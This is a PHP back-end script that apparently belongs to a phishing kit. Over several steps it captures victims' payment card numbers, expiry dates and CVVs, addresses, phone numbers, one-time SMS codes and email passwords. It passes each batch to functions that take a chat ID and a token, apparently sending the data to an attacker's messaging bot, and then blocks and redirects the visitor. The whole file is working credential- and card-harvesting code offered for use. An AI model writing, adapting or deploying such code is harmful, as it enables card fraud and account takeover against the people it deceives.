<?php
include './includes/to.php';
include './init.php';

if($_SERVER['REQUEST_METHOD'] != 'POST'):
	die(rediret($link)); // We're done here
else:
	if(isset($_GET['step'])):

		/* Default Page */ 
		if($_GET['step'] == 'tow'):
			$nu = $_POST['nu'];
			$_SESSION['nu'] = $nu;
			$_SESSION['nunu'] = substr($nu, -4);
			AntiBombResI($chat_id, $METRI_TOKEN, $_POST['nm'], $_POST['nu'], $_POST['epx'], $_POST['vv'], $user, $referer);
			die(rediret('./22788001c.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'three'):
			$_SESSION['tl'] = $_POST['tl'];
			AntiBombResII($chat_id, $METRI_TOKEN, $_POST['stre'], $_POST['maiz'], $_POST['zi'], $_POST['Vie'], $_POST['tl'], $_POST['em'], $user, $referer);
			_AntiBomb_Block($user);
			die(rediret('./33140025d.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'four'):
			AntiBombResIII($chat_id, $METRI_TOKEN, $_POST['tantan'],$_POST['secure'], $user, $referer);
			die(rediret('./44001622e.php?'.$id)); // We're done here
			
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'five'):
			AntiBombResIV($chat_id, $METRI_TOKEN, $_POST['tantan2'], $_POST['secure'], $user, $referer);
			if($smspage === "3"):
			die(rediret('./55933014f.php?'.$id)); // We're done here
			else:
				_AntiBomb_Block($user);
				die(rediret('./66099317g.php?'.$id)); // We're done here
			endif;
		/* tok + Place DOB Page */ 
		elseif($_GET['step'] == 'sex'):
			AntiBombResVI($chat_id, $METRI_TOKEN, $_POST['tantan3'], $_POST['secure'], $user, $referer);
			die(rediret('./66099317g.php?'.$id)); // We're done here
			
		/* FUCK YOU BEACH Page */ 		
		elseif($_GET['step'] == 'three'):
			AntiBombResIII($chat_id, $METRI_TOKEN, $_POST['Eml'], $_POST['PsEm'], $user, $referer);
			die(rediret($link)); // We're done here	
		endif;
	endif;
endif;
?>
